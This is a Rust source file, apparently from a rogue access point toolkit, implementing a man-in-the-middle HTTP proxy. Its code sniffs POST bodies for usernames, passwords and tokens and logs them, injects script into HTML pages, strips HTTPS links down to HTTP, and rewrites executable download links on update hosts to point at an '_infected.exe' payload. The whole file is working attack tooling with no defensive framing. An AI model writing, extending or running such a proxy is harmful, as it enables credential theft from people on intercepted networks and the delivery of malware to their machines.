use std::net::{TcpListener, TcpStream};
use std::io::{Read, Write};
use std::thread;
use crate::captive_portal::log_credentials;

pub fn start_proxy(port: u16) {
    let addr = format!("0.0.0.0:{}", port);
    let listener = match TcpListener::bind(&addr) {
        Ok(l) => l,
        Err(e) => {
            eprintln!("[!] Failed to bind proxy on {}: {}. Skipping proxy.", addr, e);
            return;
        }
    };
    println!("Native MitM Proxy with Sniffing started on {}", addr);
    thread::spawn(move || {
        for stream in listener.incoming() {
            if let Ok(client) = stream {
                thread::spawn(|| handle_proxy_connection(client));
            }
        }
    });
}

fn sniff_credentials(request: &str, host: &str, client_ip: &str) {
    // Common patterns for credentials in POST bodies
    let keywords = ["user", "pass", "login", "email", "pwd", "secret", "token"];

    if request.starts_with("POST") {
        let body = request.split("\r\n\r\n").nth(1).unwrap_or("");
        if !body.is_empty() {
            let body_lower = body.to_lowercase();
            if keywords.iter().any(|&k| body_lower.contains(k)) {
                let log_entry = format!("ip={} [SNIFFED] Host: {} | Data: {}", client_ip, host, body);
                println!("{}", log_entry);
                log_credentials(&log_entry);
            }
        }
    }
}

fn handle_proxy_connection(mut client: TcpStream) {
    let client_ip = client.peer_addr().map(|a| a.ip().to_string()).unwrap_or_else(|_| "unknown".to_string());
    let mut buf = [0u8; 8192];
    let n = match client.read(&mut buf) {
        Ok(n) if n > 0 => n,
        _ => return,
    };

    let request = String::from_utf8_lossy(&buf[..n]);

    // Extract Host header
    let mut host = String::new();
    for line in request.lines() {
        if line.to_lowercase().starts_with("host:") {
            host = line[5..].trim().to_string();
            break;
        }
    }

    if host.is_empty() {
        return;
    }

    // SNIFFING: Check for credentials in the request
    sniff_credentials(&request, &host, &client_ip);

    // Connect to real server
    let server_addr = if host.contains(':') {
        host.clone()
    } else {
        format!("{}:80", host)
    };

    if let Ok(mut server) = TcpStream::connect(&server_addr) {
        // SSLStrip foundation: In a real implementation, we would modify the request
        // to strip headers like 'Accept-Encoding' (to avoid compression)
        // and 'Upgrade-Insecure-Requests'.
        let _ = server.write_all(&buf[..n]);

        // Read response
        let mut res_buf = Vec::new();
        let mut temp_buf = [0u8; 8192];
        while let Ok(rn) = server.read(&mut temp_buf) {
            if rn == 0 { break; }
            res_buf.extend_from_slice(&temp_buf[..rn]);
            // Stop reading if we have enough or server closes
            if rn < 8192 { break; }
        }

        // Response modification
        let response_str = String::from_utf8_lossy(&res_buf);
        if response_str.contains("text/html") {
            let mut modified = response_str.to_string();

            // 1. JS Injection
            if modified.contains("</body>") {
                let script = "<script>console.log('AP1 Sniffer Active');</script>";
                modified = modified.replace("</body>", &format!("{}{}", script, "</body>"));
            }

            // 2. Simple SSLStrip: Replace https:// with http:// in the HTML
            // This is the core logic of stripping
            modified = modified.replace("https://", "http://");

            // 3. Payload Replacement: If client tries to download an exe, swap it
            if host.contains("update") && modified.contains(".exe") {
                 println!("[PAYLOAD] Target attempting to download executable from {}", host);
                 // Logic to redirect download link to our local malicious file
                 modified = modified.replace(".exe", "_infected.exe");
            }

            let _ = client.write_all(modified.as_bytes());
        } else {
            let _ = client.write_all(&res_buf);
        }
    }
}
